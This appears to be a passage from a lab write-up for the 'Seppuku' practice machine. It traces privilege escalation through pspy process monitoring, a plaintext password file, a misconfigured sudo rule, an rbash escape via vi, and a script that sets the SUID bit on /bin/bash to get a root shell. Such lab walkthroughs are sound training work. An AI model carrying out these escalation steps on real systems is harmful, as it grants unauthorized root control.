    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
...
...
 
2021/11/20 00:59:08 CMD: UID=0    PID=563    | openlitespeed (lscgid) 
2021/11/20 00:59:08 CMD: UID=0    PID=562    | /usr/sbin/apache2 -k start 
2021/11/20 00:59:08 CMD: UID=0    PID=56     | 
2021/11/20 00:59:08 CMD: UID=0    PID=555    | openlitespeed (lshttpd - main) 
2021/11/20 00:59:08 CMD: UID=33   PID=551    | nginx: worker process                            
2021/11/20 00:59:08 CMD: UID=0    PID=550    | nginx: master process /usr/sbin/nginx -g daemon on; master_process on; 
2021/11/20 00:59:08 CMD: UID=0    PID=55     | 
2021/11/20 00:59:08 CMD: UID=33   PID=545    | php-fpm: pool www                                                             
2021/11/20 00:59:08 CMD: UID=33   PID=544    | php-fpm: pool www                                                             
2021/11/20 00:59:08 CMD: UID=0    PID=543    | /usr/sbin/sshd -D 
2021/11/20 00:59:08 CMD: UID=0    PID=54     | 
2021/11/20 00:59:08 CMD: UID=0    PID=53     | 
2021/11/20 00:59:08 CMD: UID=0    PID=525    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2021/11/20 00:59:08 CMD: UID=0    PID=524    | /usr/sbin/vsftpd /etc/vsftpd.conf 
2021/11/20 00:59:08 CMD: UID=0    PID=52     | 
2021/11/20 00:59:08 CMD: UID=0    PID=518    | php-fpm: master process (/etc/php/7.3/fpm/php-fpm.conf)                       
2021/11/20 00:59:08 CMD: UID=0    PID=517    | /usr/sbin/nmbd --foreground --no-process-group 
2021/11/20 00:59:08 CMD: UID=0    PID=51     | 
2021/11/20 00:59:08 CMD: UID=0    PID=50     | 
2021/11/20 00:59:08 CMD: UID=0    PID=49     | 
2021/11/20 00:59:08 CMD: UID=0    PID=48     | 
2021/11/20 00:59:08 CMD: UID=0    PID=4      | 
2021/11/20 00:59:08 CMD: UID=0    PID=396    | /usr/sbin/cron -f 
2021/11/20 00:59:08 CMD: UID=0    PID=393    | /lib/systemd/systemd-logind 
2021/11/20 00:59:08 CMD: UID=104  PID=392    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2021/11/20 00:59:08 CMD: UID=0    PID=391    | /usr/sbin/rsyslogd -n -iNONE 
2021/11/20 00:59:08 CMD: UID=0    PID=388    | /usr/bin/vmtoolsd 
2021/11/20 00:59:08 CMD: UID=101  PID=387    | /lib/systemd/systemd-timesyncd 
2021/11/20 00:59:08 CMD: UID=0    PID=386    | /usr/bin/VGAuthService 
2021/11/20 00:59:08 CMD: UID=1000 PID=3329   | ./pspy64s 
2021/11/20 00:59:08 CMD: UID=0    PID=3322   | 
2021/11/20 00:59:08 CMD: UID=0    PID=331    | 
2021/11/20 00:59:08 CMD: UID=0    PID=3308   | 
2021/11/20 00:59:08 CMD: UID=0    PID=330    | 
2021/11/20 00:59:08 CMD: UID=0    PID=30     | 
2021/11/20 00:59:08 CMD: UID=0    PID=3      | 
2021/11/20 00:59:08 CMD: UID=0    PID=29     | 
2021/11/20 00:59:08 CMD: UID=0    PID=28     | 
2021/11/20 00:59:08 CMD: UID=0    PID=273    | /lib/systemd/systemd-udevd 
2021/11/20 00:59:08 CMD: UID=0    PID=27     | 
2021/11/20 00:59:08 CMD: UID=0    PID=26     | 
2021/11/20 00:59:08 CMD: UID=0    PID=251    | /lib/systemd/systemd-journald 
2021/11/20 00:59:08 CMD: UID=0    PID=25     | 
2021/11/20 00:59:08 CMD: UID=0    PID=24     | 
....
....
2021/11/20 00:59:08 CMD: UID=0    PID=12     | 
2021/11/20 00:59:08 CMD: UID=0    PID=11     | 
2021/11/20 00:59:08 CMD: UID=1000 PID=1073   | /bin/bash 
2021/11/20 00:59:08 CMD: UID=1000 PID=1071   | vi 
2021/11/20 00:59:08 CMD: UID=1000 PID=1059   | -rbash 
2021/11/20 00:59:08 CMD: UID=1000 PID=1058   | sshd: seppuku@pts/0  
2021/11/20 00:59:08 CMD: UID=1000 PID=1045   | (sd-pam) 
2021/11/20 00:59:08 CMD: UID=1000 PID=1044   | /lib/systemd/systemd --user 
2021/11/20 00:59:08 CMD: UID=0    PID=1041   | sshd: seppuku [priv] 
2021/11/20 00:59:08 CMD: UID=0    PID=1019   | /usr/sbin/smbd --foreground --no-process-group 
2021/11/20 00:59:08 CMD: UID=0    PID=1017   | /usr/sbin/smbd --foreground --no-process-group 
2021/11/20 00:59:08 CMD: UID=0    PID=1016   | /usr/sbin/smbd --foreground --no-process-group 
2021/11/20 00:59:08 CMD: UID=0    PID=1014   | /usr/sbin/smbd --foreground --no-process-group 
2021/11/20 00:59:08 CMD: UID=0    PID=10     | 
2021/11/20 00:59:08 CMD: UID=0    PID=1      | /sbin/init 
2021/11/20 01:00:01 CMD: UID=0    PID=3337   | /usr/sbin/CRON -f 
2021/11/20 01:00:01 CMD: UID=0    PID=3338   | /usr/sbin/CRON -f 
2021/11/20 01:00:01 CMD: UID=0    PID=3339   | /bin/sh -c /usr/bin/delhis 
2021/11/20 01:00:01 CMD: UID=0    PID=3340   | /bin/bash /usr/bin/delhis 
2021/11/20 01:00:01 CMD: UID=0    PID=3341   | sudo rm -r /home/samurai/.bash_history 
2021/11/20 01:00:01 CMD: UID=0    PID=3342   | /bin/bash /usr/bin/delhis 
2021/11/20 01:00:01 CMD: UID=0    PID=3343   | sudo rm -r /home/seppuku/.bash_history 
2021/11/20 01:00:01 CMD: UID=0    PID=3344   | /bin/bash /usr/bin/delhis 
2021/11/20 01:00:01 CMD: UID=0    PID=3345   | sudo rm -r /home/tanto/.bash_history 
```

```console
seppuku@seppuku:/tmp$ find / -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/mount.cifs
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/su
/usr/bin/sudo
```

```console
seppuku@seppuku:/home/tanto$ cd ..
seppuku@seppuku:/home$ ls
samurai  seppuku  tanto
seppuku@seppuku:/home$ cd seppuku/
seppuku@seppuku:~$ ls -la
total 36
drwxr-xr-x 4 seppuku seppuku 4096 Nov 20 00:40 .
drwxr-xr-x 5 root    root    4096 May 13  2020 ..
-rw-r--r-- 1 seppuku seppuku  220 May 13  2020 .bash_logout
-rw-r--r-- 1 seppuku seppuku 3526 May 13  2020 .bashrc
drwx------ 3 seppuku seppuku 4096 Nov 20 01:03 .gnupg
drwxr-xr-x 3 seppuku seppuku 4096 Nov 20 00:40 .local
-rw-r--r-- 1 root    root      20 May 13  2020 .passwd
-rw-r--r-- 1 seppuku seppuku  807 May 13  2020 .profile
-rw-r--r-- 1 seppuku seppuku   33 Nov 20 00:29 local.txt
seppuku@seppuku:~$ cat .passwd 
12345685213456!@!@A
```
```console
seppuku@seppuku:~$ su samurai
Password: 
samurai@seppuku:/home/seppuku$ id
uid=1001(samurai) gid=1002(samurai) groups=1002(samurai)
samurai@seppuku:/home/seppuku$ sudo -l
Matching Defaults entries for samurai on seppuku:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User samurai may run the following commands on seppuku:
    (ALL) NOPASSWD: /../../../../../../home/tanto/.cgi_bin/bin /tmp/*
samurai@seppuku:/home/seppuku$ 
```

```console
samurai@seppuku:/home$ cd tanto/
samurai@seppuku:/home/tanto$ mkdir .cgi_bin
mkdir: cannot create directory '.cgi_bin': Permission denied
```

```console
root@kali:/OSCPv3/offsec_pg/Seppuku# cd keys/
root@kali:/OSCPv3/offsec_pg/Seppuku/keys# ls
private  private.bak
root@kali:/OSCPv3/offsec_pg/Seppuku/keys# chmod 600 private
root@kali:/OSCPv3/offsec_pg/Seppuku/keys# ssh -i private tanto@192.168.66.90
Linux seppuku 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
tanto@seppuku:~$ whoami
tanto
```

```console
tanto@seppuku:~$ cd .cgi_bin/
-rbash: cd: restricted
tanto@seppuku:~$ vi
tanto@seppuku:~$ cd .cgi_bin/
tanto@seppuku:~/.cgi_bin$ echo "chmod u+s /bin/bash" > bin
tanto@seppuku:~/.cgi_bin$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
tanto@seppuku:~/.cgi_bin$ chmod +x bin 
```

```console
samurai@seppuku:/home/tanto$ sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/*
samurai@seppuku:/home/tanto$ 
```
```console
tanto@seppuku:~/.cgi_bin$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
tanto@seppuku:~/.cgi_bin$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0# cd /root/
bash-5.0# ls
proof.txt  root.txt
bash-5.0# cat proof.txt 
5bcb9d240dc36f9f37dbdd5ea5b6c6bf
``` 

